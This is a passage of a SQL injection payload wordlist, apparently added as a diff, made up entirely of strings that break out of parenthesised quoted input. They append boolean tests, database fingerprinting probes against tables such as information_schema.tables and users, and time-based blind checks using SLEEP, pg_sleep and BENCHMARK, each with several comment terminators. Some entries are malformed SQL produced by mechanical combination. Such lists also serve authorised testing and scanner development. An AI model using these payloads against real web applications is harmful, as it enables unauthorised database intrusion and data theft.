+') OR EXISTS(SELECT * FROM information_schema.tables)#
+') OR EXISTS(SELECT * FROM information_schema.tables);%00
+') OR EXISTS(SELECT * FROM information_schema.tables)/*
+') OR EXISTS(SELECT * FROM information_schema.tables)/**/
+') OR EXISTS(SELECT * FROM information_schema.tables)
+') AND 1=1--
+') AND 1=1-- -
+') AND 1=1#
+') AND 1=1;%00
+') AND 1=1/*
+') AND 1=1/**/
+') AND 1=1
+') AND 1=2--
+') AND 1=2-- -
+') AND 1=2#
+') AND 1=2;%00
+') AND 1=2/*
+') AND 1=2/**/
+') AND 1=2
+') AND 'a'='a'--
+') AND 'a'='a'-- -
+') AND 'a'='a'#
+') AND 'a'='a';%00
+') AND 'a'='a'/*
+') AND 'a'='a'/**/
+') AND 'a'='a'
+') AND 'x'='y'--
+') AND 'x'='y'-- -
+') AND 'x'='y'#
+') AND 'x'='y';%00
+') AND 'x'='y'/*
+') AND 'x'='y'/**/
+') AND 'x'='y'
+') AND user()=user()--
+') AND user()=user()-- -
+') AND user()=user()#
+') AND user()=user();%00
+') AND user()=user()/*
+') AND user()=user()/**/
+') AND user()=user()
+') AND version()=version()--
+') AND version()=version()-- -
+') AND version()=version()#
+') AND version()=version();%00
+') AND version()=version()/*
+') AND version()=version()/**/
+') AND version()=version()
+') AND DATABASE()=DATABASE()--
+') AND DATABASE()=DATABASE()-- -
+') AND DATABASE()=DATABASE()#
+') AND DATABASE()=DATABASE();%00
+') AND DATABASE()=DATABASE()/*
+') AND DATABASE()=DATABASE()/**/
+') AND DATABASE()=DATABASE()
+') AND (SELECT COUNT(*) FROM users)>0--
+') AND (SELECT COUNT(*) FROM users)>0-- -
+') AND (SELECT COUNT(*) FROM users)>0#
+') AND (SELECT COUNT(*) FROM users)>0;%00
+') AND (SELECT COUNT(*) FROM users)>0/*
+') AND (SELECT COUNT(*) FROM users)>0/**/
+') AND (SELECT COUNT(*) FROM users)>0
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') AND SLEEP(2)--
+') AND SLEEP(2)-- -
+') AND SLEEP(2)#
+') AND SLEEP(2);%00
+') AND SLEEP(2)/*
+') AND SLEEP(2)/**/
+') AND SLEEP(2)
+') AND SLEEP(5)--
+') AND SLEEP(5)-- -
+') AND SLEEP(5)#
+') AND SLEEP(5);%00
+') AND SLEEP(5)/*
+') AND SLEEP(5)/**/
+') AND SLEEP(5)
+') AND BENCHMARK(100000,MD5(1))--
+') AND BENCHMARK(100000,MD5(1))-- -
+') AND BENCHMARK(100000,MD5(1))#
+') AND BENCHMARK(100000,MD5(1));%00
+') AND BENCHMARK(100000,MD5(1))/*
+') AND BENCHMARK(100000,MD5(1))/**/
+') AND BENCHMARK(100000,MD5(1))
+') AND pg_sleep(2)--
+') AND pg_sleep(2)-- -
+') AND pg_sleep(2)#
+') AND pg_sleep(2);%00
+') AND pg_sleep(2)/*
+') AND pg_sleep(2)/**/
+') AND pg_sleep(2)
+') AND pg_sleep(5)--
+') AND pg_sleep(5)-- -
+') AND pg_sleep(5)#
+') AND pg_sleep(5);%00
+') AND pg_sleep(5)/*
+') AND pg_sleep(5)/**/
+') AND pg_sleep(5)
+') AND EXISTS(SELECT * FROM information_schema.tables)--
+') AND EXISTS(SELECT * FROM information_schema.tables)-- -
+') AND EXISTS(SELECT * FROM information_schema.tables)#
+') AND EXISTS(SELECT * FROM information_schema.tables);%00
+') AND EXISTS(SELECT * FROM information_schema.tables)/*
+') AND EXISTS(SELECT * FROM information_schema.tables)/**/
+') AND EXISTS(SELECT * FROM information_schema.tables)
+') OR NOT 1=1--
+') OR NOT 1=1-- -
+') OR NOT 1=1#
+') OR NOT 1=1;%00
+') OR NOT 1=1/*
+') OR NOT 1=1/**/
+') OR NOT 1=1
+') OR NOT 1=2--
+') OR NOT 1=2-- -
+') OR NOT 1=2#
+') OR NOT 1=2;%00
+') OR NOT 1=2/*
+') OR NOT 1=2/**/
+') OR NOT 1=2
+') OR NOT 'a'='a'--
+') OR NOT 'a'='a'-- -
+') OR NOT 'a'='a'#
+') OR NOT 'a'='a';%00
+') OR NOT 'a'='a'/*
+') OR NOT 'a'='a'/**/
+') OR NOT 'a'='a'
+') OR NOT 'x'='y'--
+') OR NOT 'x'='y'-- -
+') OR NOT 'x'='y'#
+') OR NOT 'x'='y';%00
+') OR NOT 'x'='y'/*
+') OR NOT 'x'='y'/**/
+') OR NOT 'x'='y'
+') OR NOT user()=user()--
+') OR NOT user()=user()-- -
+') OR NOT user()=user()#
+') OR NOT user()=user();%00
+') OR NOT user()=user()/*
+') OR NOT user()=user()/**/
+') OR NOT user()=user()
+') OR NOT version()=version()--
+') OR NOT version()=version()-- -
+') OR NOT version()=version()#
+') OR NOT version()=version();%00
+') OR NOT version()=version()/*
+') OR NOT version()=version()/**/
+') OR NOT version()=version()
+') OR NOT DATABASE()=DATABASE()--
+') OR NOT DATABASE()=DATABASE()-- -
+') OR NOT DATABASE()=DATABASE()#
+') OR NOT DATABASE()=DATABASE();%00
+') OR NOT DATABASE()=DATABASE()/*
+') OR NOT DATABASE()=DATABASE()/**/
+') OR NOT DATABASE()=DATABASE()
+') OR NOT (SELECT COUNT(*) FROM users)>0--
+') OR NOT (SELECT COUNT(*) FROM users)>0-- -
+') OR NOT (SELECT COUNT(*) FROM users)>0#
+') OR NOT (SELECT COUNT(*) FROM users)>0;%00
+') OR NOT (SELECT COUNT(*) FROM users)>0/*
+') OR NOT (SELECT COUNT(*) FROM users)>0/**/
+') OR NOT (SELECT COUNT(*) FROM users)>0
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') OR NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') OR NOT SLEEP(2)--
+') OR NOT SLEEP(2)-- -
+') OR NOT SLEEP(2)#
+') OR NOT SLEEP(2);%00
+') OR NOT SLEEP(2)/*
+') OR NOT SLEEP(2)/**/
+') OR NOT SLEEP(2)
+') OR NOT SLEEP(5)--
+') OR NOT SLEEP(5)-- -
+') OR NOT SLEEP(5)#
+') OR NOT SLEEP(5);%00
+') OR NOT SLEEP(5)/*
+') OR NOT SLEEP(5)/**/
+') OR NOT SLEEP(5)
+') OR NOT BENCHMARK(100000,MD5(1))--
+') OR NOT BENCHMARK(100000,MD5(1))-- -
+') OR NOT BENCHMARK(100000,MD5(1))#
+') OR NOT BENCHMARK(100000,MD5(1));%00
+') OR NOT BENCHMARK(100000,MD5(1))/*
+') OR NOT BENCHMARK(100000,MD5(1))/**/
+') OR NOT BENCHMARK(100000,MD5(1))
+') OR NOT pg_sleep(2)--
+') OR NOT pg_sleep(2)-- -
+') OR NOT pg_sleep(2)#
+') OR NOT pg_sleep(2);%00
+') OR NOT pg_sleep(2)/*
+') OR NOT pg_sleep(2)/**/
+') OR NOT pg_sleep(2)
+') OR NOT pg_sleep(5)--
+') OR NOT pg_sleep(5)-- -
+') OR NOT pg_sleep(5)#
+') OR NOT pg_sleep(5);%00
+') OR NOT pg_sleep(5)/*
+') OR NOT pg_sleep(5)/**/
+') OR NOT pg_sleep(5)
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)--
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)#
+') OR NOT EXISTS(SELECT * FROM information_schema.tables);%00
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)/*
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+') OR NOT EXISTS(SELECT * FROM information_schema.tables)
+') AND NOT 1=1--
+') AND NOT 1=1-- -
+') AND NOT 1=1#
+') AND NOT 1=1;%00
+') AND NOT 1=1/*
+') AND NOT 1=1/**/
+') AND NOT 1=1
+') AND NOT 1=2--
+') AND NOT 1=2-- -
+') AND NOT 1=2#
+') AND NOT 1=2;%00
+') AND NOT 1=2/*
+') AND NOT 1=2/**/
+') AND NOT 1=2
+') AND NOT 'a'='a'--
+') AND NOT 'a'='a'-- -
+') AND NOT 'a'='a'#
+') AND NOT 'a'='a';%00
+') AND NOT 'a'='a'/*
+') AND NOT 'a'='a'/**/
+') AND NOT 'a'='a'
+') AND NOT 'x'='y'--
+') AND NOT 'x'='y'-- -
+') AND NOT 'x'='y'#
+') AND NOT 'x'='y';%00
+') AND NOT 'x'='y'/*
+') AND NOT 'x'='y'/**/
+') AND NOT 'x'='y'
+') AND NOT user()=user()--
+') AND NOT user()=user()-- -
+') AND NOT user()=user()#
+') AND NOT user()=user();%00
+') AND NOT user()=user()/*
+') AND NOT user()=user()/**/
+') AND NOT user()=user()
+') AND NOT version()=version()--
+') AND NOT version()=version()-- -
+') AND NOT version()=version()#
+') AND NOT version()=version();%00
+') AND NOT version()=version()/*
+') AND NOT version()=version()/**/
+') AND NOT version()=version()
+') AND NOT DATABASE()=DATABASE()--
+') AND NOT DATABASE()=DATABASE()-- -
+') AND NOT DATABASE()=DATABASE()#
+') AND NOT DATABASE()=DATABASE();%00
+') AND NOT DATABASE()=DATABASE()/*
+') AND NOT DATABASE()=DATABASE()/**/
+') AND NOT DATABASE()=DATABASE()
+') AND NOT (SELECT COUNT(*) FROM users)>0--
+') AND NOT (SELECT COUNT(*) FROM users)>0-- -
+') AND NOT (SELECT COUNT(*) FROM users)>0#
+') AND NOT (SELECT COUNT(*) FROM users)>0;%00
+') AND NOT (SELECT COUNT(*) FROM users)>0/*
+') AND NOT (SELECT COUNT(*) FROM users)>0/**/
+') AND NOT (SELECT COUNT(*) FROM users)>0
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') AND NOT (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') AND NOT SLEEP(2)--
+') AND NOT SLEEP(2)-- -
+') AND NOT SLEEP(2)#
+') AND NOT SLEEP(2);%00
+') AND NOT SLEEP(2)/*
+') AND NOT SLEEP(2)/**/
+') AND NOT SLEEP(2)
+') AND NOT SLEEP(5)--
+') AND NOT SLEEP(5)-- -
+') AND NOT SLEEP(5)#
+') AND NOT SLEEP(5);%00
+') AND NOT SLEEP(5)/*
+') AND NOT SLEEP(5)/**/
+') AND NOT SLEEP(5)
+') AND NOT BENCHMARK(100000,MD5(1))--
+') AND NOT BENCHMARK(100000,MD5(1))-- -
+') AND NOT BENCHMARK(100000,MD5(1))#
+') AND NOT BENCHMARK(100000,MD5(1));%00
+') AND NOT BENCHMARK(100000,MD5(1))/*
+') AND NOT BENCHMARK(100000,MD5(1))/**/
+') AND NOT BENCHMARK(100000,MD5(1))
+') AND NOT pg_sleep(2)--
+') AND NOT pg_sleep(2)-- -
+') AND NOT pg_sleep(2)#
+') AND NOT pg_sleep(2);%00
+') AND NOT pg_sleep(2)/*
+') AND NOT pg_sleep(2)/**/
+') AND NOT pg_sleep(2)
+') AND NOT pg_sleep(5)--
+') AND NOT pg_sleep(5)-- -
+') AND NOT pg_sleep(5)#
+') AND NOT pg_sleep(5);%00
+') AND NOT pg_sleep(5)/*
+') AND NOT pg_sleep(5)/**/
+') AND NOT pg_sleep(5)
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)--
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)-- -
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)#
+') AND NOT EXISTS(SELECT * FROM information_schema.tables);%00
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)/*
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)/**/
+') AND NOT EXISTS(SELECT * FROM information_schema.tables)
+') OR EXISTS 1=1--
+') OR EXISTS 1=1-- -
+') OR EXISTS 1=1#
+') OR EXISTS 1=1;%00
+') OR EXISTS 1=1/*
+') OR EXISTS 1=1/**/
+') OR EXISTS 1=1
+') OR EXISTS 1=2--
+') OR EXISTS 1=2-- -
+') OR EXISTS 1=2#
+') OR EXISTS 1=2;%00
+') OR EXISTS 1=2/*
+') OR EXISTS 1=2/**/
+') OR EXISTS 1=2
+') OR EXISTS 'a'='a'--
+') OR EXISTS 'a'='a'-- -
+') OR EXISTS 'a'='a'#
+') OR EXISTS 'a'='a';%00
+') OR EXISTS 'a'='a'/*
+') OR EXISTS 'a'='a'/**/
+') OR EXISTS 'a'='a'
+') OR EXISTS 'x'='y'--
+') OR EXISTS 'x'='y'-- -
+') OR EXISTS 'x'='y'#
+') OR EXISTS 'x'='y';%00
+') OR EXISTS 'x'='y'/*
+') OR EXISTS 'x'='y'/**/
+') OR EXISTS 'x'='y'
+') OR EXISTS user()=user()--
+') OR EXISTS user()=user()-- -
+') OR EXISTS user()=user()#
+') OR EXISTS user()=user();%00
+') OR EXISTS user()=user()/*
+') OR EXISTS user()=user()/**/
+') OR EXISTS user()=user()
+') OR EXISTS version()=version()--
+') OR EXISTS version()=version()-- -
+') OR EXISTS version()=version()#
+') OR EXISTS version()=version();%00
+') OR EXISTS version()=version()/*
+') OR EXISTS version()=version()/**/
+') OR EXISTS version()=version()
+') OR EXISTS DATABASE()=DATABASE()--
+') OR EXISTS DATABASE()=DATABASE()-- -
+') OR EXISTS DATABASE()=DATABASE()#
+') OR EXISTS DATABASE()=DATABASE();%00
+') OR EXISTS DATABASE()=DATABASE()/*
+') OR EXISTS DATABASE()=DATABASE()/**/
+') OR EXISTS DATABASE()=DATABASE()
+') OR EXISTS (SELECT COUNT(*) FROM users)>0--
+') OR EXISTS (SELECT COUNT(*) FROM users)>0-- -
+') OR EXISTS (SELECT COUNT(*) FROM users)>0#
+') OR EXISTS (SELECT COUNT(*) FROM users)>0;%00
+') OR EXISTS (SELECT COUNT(*) FROM users)>0/*
+') OR EXISTS (SELECT COUNT(*) FROM users)>0/**/
+') OR EXISTS (SELECT COUNT(*) FROM users)>0
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') OR EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') OR EXISTS SLEEP(2)--
+') OR EXISTS SLEEP(2)-- -
+') OR EXISTS SLEEP(2)#
+') OR EXISTS SLEEP(2);%00
+') OR EXISTS SLEEP(2)/*
+') OR EXISTS SLEEP(2)/**/
+') OR EXISTS SLEEP(2)
+') OR EXISTS SLEEP(5)--
+') OR EXISTS SLEEP(5)-- -
+') OR EXISTS SLEEP(5)#
+') OR EXISTS SLEEP(5);%00
+') OR EXISTS SLEEP(5)/*
+') OR EXISTS SLEEP(5)/**/
+') OR EXISTS SLEEP(5)
+') OR EXISTS BENCHMARK(100000,MD5(1))--
+') OR EXISTS BENCHMARK(100000,MD5(1))-- -
+') OR EXISTS BENCHMARK(100000,MD5(1))#
+') OR EXISTS BENCHMARK(100000,MD5(1));%00
+') OR EXISTS BENCHMARK(100000,MD5(1))/*
+') OR EXISTS BENCHMARK(100000,MD5(1))/**/
+') OR EXISTS BENCHMARK(100000,MD5(1))
+') OR EXISTS pg_sleep(2)--
+') OR EXISTS pg_sleep(2)-- -
+') OR EXISTS pg_sleep(2)#
+') OR EXISTS pg_sleep(2);%00
+') OR EXISTS pg_sleep(2)/*
+') OR EXISTS pg_sleep(2)/**/
+') OR EXISTS pg_sleep(2)
+') OR EXISTS pg_sleep(5)--
+') OR EXISTS pg_sleep(5)-- -
+') OR EXISTS pg_sleep(5)#
+') OR EXISTS pg_sleep(5);%00
+') OR EXISTS pg_sleep(5)/*
+') OR EXISTS pg_sleep(5)/**/
+') OR EXISTS pg_sleep(5)
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+') OR EXISTS EXISTS(SELECT * FROM information_schema.tables)
+') AND EXISTS 1=1--
+') AND EXISTS 1=1-- -
+') AND EXISTS 1=1#
+') AND EXISTS 1=1;%00
+') AND EXISTS 1=1/*
+') AND EXISTS 1=1/**/
+') AND EXISTS 1=1
+') AND EXISTS 1=2--
+') AND EXISTS 1=2-- -
+') AND EXISTS 1=2#
+') AND EXISTS 1=2;%00
+') AND EXISTS 1=2/*
+') AND EXISTS 1=2/**/
+') AND EXISTS 1=2
+') AND EXISTS 'a'='a'--
+') AND EXISTS 'a'='a'-- -
+') AND EXISTS 'a'='a'#
+') AND EXISTS 'a'='a';%00
+') AND EXISTS 'a'='a'/*
+') AND EXISTS 'a'='a'/**/
+') AND EXISTS 'a'='a'
+') AND EXISTS 'x'='y'--
+') AND EXISTS 'x'='y'-- -
+') AND EXISTS 'x'='y'#
+') AND EXISTS 'x'='y';%00
+') AND EXISTS 'x'='y'/*
+') AND EXISTS 'x'='y'/**/
+') AND EXISTS 'x'='y'
+') AND EXISTS user()=user()--
+') AND EXISTS user()=user()-- -
+') AND EXISTS user()=user()#
+') AND EXISTS user()=user();%00
+') AND EXISTS user()=user()/*
+') AND EXISTS user()=user()/**/
+') AND EXISTS user()=user()
+') AND EXISTS version()=version()--
+') AND EXISTS version()=version()-- -
+') AND EXISTS version()=version()#
+') AND EXISTS version()=version();%00
+') AND EXISTS version()=version()/*
+') AND EXISTS version()=version()/**/
+') AND EXISTS version()=version()
+') AND EXISTS DATABASE()=DATABASE()--
+') AND EXISTS DATABASE()=DATABASE()-- -
+') AND EXISTS DATABASE()=DATABASE()#
+') AND EXISTS DATABASE()=DATABASE();%00
+') AND EXISTS DATABASE()=DATABASE()/*
+') AND EXISTS DATABASE()=DATABASE()/**/
+') AND EXISTS DATABASE()=DATABASE()
+') AND EXISTS (SELECT COUNT(*) FROM users)>0--
+') AND EXISTS (SELECT COUNT(*) FROM users)>0-- -
+') AND EXISTS (SELECT COUNT(*) FROM users)>0#
+') AND EXISTS (SELECT COUNT(*) FROM users)>0;%00
+') AND EXISTS (SELECT COUNT(*) FROM users)>0/*
+') AND EXISTS (SELECT COUNT(*) FROM users)>0/**/
+') AND EXISTS (SELECT COUNT(*) FROM users)>0
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+') AND EXISTS (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+') AND EXISTS SLEEP(2)--
+') AND EXISTS SLEEP(2)-- -
+') AND EXISTS SLEEP(2)#
+') AND EXISTS SLEEP(2);%00
+') AND EXISTS SLEEP(2)/*
+') AND EXISTS SLEEP(2)/**/
+') AND EXISTS SLEEP(2)
+') AND EXISTS SLEEP(5)--
+') AND EXISTS SLEEP(5)-- -
+') AND EXISTS SLEEP(5)#
+') AND EXISTS SLEEP(5);%00
+') AND EXISTS SLEEP(5)/*
+') AND EXISTS SLEEP(5)/**/
+') AND EXISTS SLEEP(5)
+') AND EXISTS BENCHMARK(100000,MD5(1))--
+') AND EXISTS BENCHMARK(100000,MD5(1))-- -
+') AND EXISTS BENCHMARK(100000,MD5(1))#
+') AND EXISTS BENCHMARK(100000,MD5(1));%00
+') AND EXISTS BENCHMARK(100000,MD5(1))/*
+') AND EXISTS BENCHMARK(100000,MD5(1))/**/
+') AND EXISTS BENCHMARK(100000,MD5(1))
+') AND EXISTS pg_sleep(2)--
+') AND EXISTS pg_sleep(2)-- -
+') AND EXISTS pg_sleep(2)#
+') AND EXISTS pg_sleep(2);%00
+') AND EXISTS pg_sleep(2)/*
+') AND EXISTS pg_sleep(2)/**/
+') AND EXISTS pg_sleep(2)
+') AND EXISTS pg_sleep(5)--
+') AND EXISTS pg_sleep(5)-- -
+') AND EXISTS pg_sleep(5)#
+') AND EXISTS pg_sleep(5);%00
+') AND EXISTS pg_sleep(5)/*
+') AND EXISTS pg_sleep(5)/**/
+') AND EXISTS pg_sleep(5)
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)--
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)-- -
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)#
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables);%00
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/*
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)/**/
+') AND EXISTS EXISTS(SELECT * FROM information_schema.tables)
+") OR 1=1--
+") OR 1=1-- -
+") OR 1=1#
+") OR 1=1;%00
+") OR 1=1/*
+") OR 1=1/**/
+") OR 1=1
+") OR 1=2--
+") OR 1=2-- -
+") OR 1=2#
+") OR 1=2;%00
+") OR 1=2/*
+") OR 1=2/**/
+") OR 1=2
+") OR 'a'='a'--
+") OR 'a'='a'-- -
+") OR 'a'='a'#
+") OR 'a'='a';%00
+") OR 'a'='a'/*
+") OR 'a'='a'/**/
+") OR 'a'='a'
+") OR 'x'='y'--
+") OR 'x'='y'-- -
+") OR 'x'='y'#
+") OR 'x'='y';%00
+") OR 'x'='y'/*
+") OR 'x'='y'/**/
+") OR 'x'='y'
+") OR user()=user()--
+") OR user()=user()-- -
+") OR user()=user()#
+") OR user()=user();%00
+") OR user()=user()/*
+") OR user()=user()/**/
+") OR user()=user()
+") OR version()=version()--
+") OR version()=version()-- -
+") OR version()=version()#
+") OR version()=version();%00
+") OR version()=version()/*
+") OR version()=version()/**/
+") OR version()=version()
+") OR DATABASE()=DATABASE()--
+") OR DATABASE()=DATABASE()-- -
+") OR DATABASE()=DATABASE()#
+") OR DATABASE()=DATABASE();%00
+") OR DATABASE()=DATABASE()/*
+") OR DATABASE()=DATABASE()/**/
+") OR DATABASE()=DATABASE()
+") OR (SELECT COUNT(*) FROM users)>0--
+") OR (SELECT COUNT(*) FROM users)>0-- -
+") OR (SELECT COUNT(*) FROM users)>0#
+") OR (SELECT COUNT(*) FROM users)>0;%00
+") OR (SELECT COUNT(*) FROM users)>0/*
+") OR (SELECT COUNT(*) FROM users)>0/**/
+") OR (SELECT COUNT(*) FROM users)>0
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") OR (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") OR SLEEP(2)--
+") OR SLEEP(2)-- -
+") OR SLEEP(2)#
+") OR SLEEP(2);%00
+") OR SLEEP(2)/*
+") OR SLEEP(2)/**/
+") OR SLEEP(2)
+") OR SLEEP(5)--
+") OR SLEEP(5)-- -
+") OR SLEEP(5)#
+") OR SLEEP(5);%00
+") OR SLEEP(5)/*
+") OR SLEEP(5)/**/
+") OR SLEEP(5)
+") OR BENCHMARK(100000,MD5(1))--
+") OR BENCHMARK(100000,MD5(1))-- -
+") OR BENCHMARK(100000,MD5(1))#
+") OR BENCHMARK(100000,MD5(1));%00
+") OR BENCHMARK(100000,MD5(1))/*
+") OR BENCHMARK(100000,MD5(1))/**/
+") OR BENCHMARK(100000,MD5(1))
+") OR pg_sleep(2)--
+") OR pg_sleep(2)-- -
+") OR pg_sleep(2)#
+") OR pg_sleep(2);%00
+") OR pg_sleep(2)/*
+") OR pg_sleep(2)/**/
+") OR pg_sleep(2)
+") OR pg_sleep(5)--
+") OR pg_sleep(5)-- -
+") OR pg_sleep(5)#
+") OR pg_sleep(5);%00
+") OR pg_sleep(5)/*
+") OR pg_sleep(5)/**/
+") OR pg_sleep(5)
+") OR EXISTS(SELECT * FROM information_schema.tables)--
+") OR EXISTS(SELECT * FROM information_schema.tables)-- -
+") OR EXISTS(SELECT * FROM information_schema.tables)#
+") OR EXISTS(SELECT * FROM information_schema.tables);%00
+") OR EXISTS(SELECT * FROM information_schema.tables)/*
+") OR EXISTS(SELECT * FROM information_schema.tables)/**/
+") OR EXISTS(SELECT * FROM information_schema.tables)
+") AND 1=1--
+") AND 1=1-- -
+") AND 1=1#
+") AND 1=1;%00
+") AND 1=1/*
+") AND 1=1/**/
+") AND 1=1
+") AND 1=2--
+") AND 1=2-- -
+") AND 1=2#
+") AND 1=2;%00
+") AND 1=2/*
+") AND 1=2/**/
+") AND 1=2
+") AND 'a'='a'--
+") AND 'a'='a'-- -
+") AND 'a'='a'#
+") AND 'a'='a';%00
+") AND 'a'='a'/*
+") AND 'a'='a'/**/
+") AND 'a'='a'
+") AND 'x'='y'--
+") AND 'x'='y'-- -
+") AND 'x'='y'#
+") AND 'x'='y';%00
+") AND 'x'='y'/*
+") AND 'x'='y'/**/
+") AND 'x'='y'
+") AND user()=user()--
+") AND user()=user()-- -
+") AND user()=user()#
+") AND user()=user();%00
+") AND user()=user()/*
+") AND user()=user()/**/
+") AND user()=user()
+") AND version()=version()--
+") AND version()=version()-- -
+") AND version()=version()#
+") AND version()=version();%00
+") AND version()=version()/*
+") AND version()=version()/**/
+") AND version()=version()
+") AND DATABASE()=DATABASE()--
+") AND DATABASE()=DATABASE()-- -
+") AND DATABASE()=DATABASE()#
+") AND DATABASE()=DATABASE();%00
+") AND DATABASE()=DATABASE()/*
+") AND DATABASE()=DATABASE()/**/
+") AND DATABASE()=DATABASE()
+") AND (SELECT COUNT(*) FROM users)>0--
+") AND (SELECT COUNT(*) FROM users)>0-- -
+") AND (SELECT COUNT(*) FROM users)>0#
+") AND (SELECT COUNT(*) FROM users)>0;%00
+") AND (SELECT COUNT(*) FROM users)>0/*
+") AND (SELECT COUNT(*) FROM users)>0/**/
+") AND (SELECT COUNT(*) FROM users)>0
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL--
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL-- -
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL#
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL;%00
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/*
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL/**/
+") AND (SELECT TOP 1 name FROM sys.databases) IS NOT NULL
+") AND SLEEP(2)--
+") AND SLEEP(2)-- -
+") AND SLEEP(2)#
+") AND SLEEP(2);%00
+") AND SLEEP(2)/*
+") AND SLEEP(2)/**/
+") AND SLEEP(2)
+") AND SLEEP(5)--
+") AND SLEEP(5)-- -
+") AND SLEEP(5)#
+") AND SLEEP(5);%00
+") AND SLEEP(5)/*
+") AND SLEEP(5)/**/
+") AND SLEEP(5)
+") AND BENCHMARK(100000,MD5(1))--
+") AND BENCHMARK(100000,MD5(1))-- -
+") AND BENCHMARK(100000,MD5(1))#
+") AND BENCHMARK(100000,MD5(1));%00
+") AND BENCHMARK(100000,MD5(1))/*
+") AND BENCHMARK(100000,MD5(1))/**/
+") AND BENCHMARK(100000,MD5(1))
+") AND pg_sleep(2)--
+") AND pg_sleep(2)-- -
+") AND pg_sleep(2)#
+") AND pg_sleep(2);%00
+") AND pg_sleep(2)/*
+") AND pg_sleep(2)/**/
+") AND pg_sleep(2)
+") AND pg_sleep(5)--
+") AND pg_sleep(5)-- -
+") AND pg_sleep(5)#
+") AND pg_sleep(5);%00
+") AND pg_sleep(5)/*
+") AND pg_sleep(5)/**/
+") AND pg_sleep(5)
+") AND EXISTS(SELECT * FROM information_schema.tables)--
+") AND EXISTS(SELECT * FROM information_schema.tables)-- -
+") AND EXISTS(SELECT * FROM information_schema.tables)#
+") AND EXISTS(SELECT * FROM information_schema.tables);%00
+") AND EXISTS(SELECT * FROM information_schema.tables)/*
+") AND EXISTS(SELECT * FROM information_schema.tables)/**/
+") AND EXISTS(SELECT * FROM information_schema.tables)
+") OR NOT 1=1--
+") OR NOT 1=1-- -
+") OR NOT 1=1#
+") OR NOT 1=1;%00
+") OR NOT 1=1/*
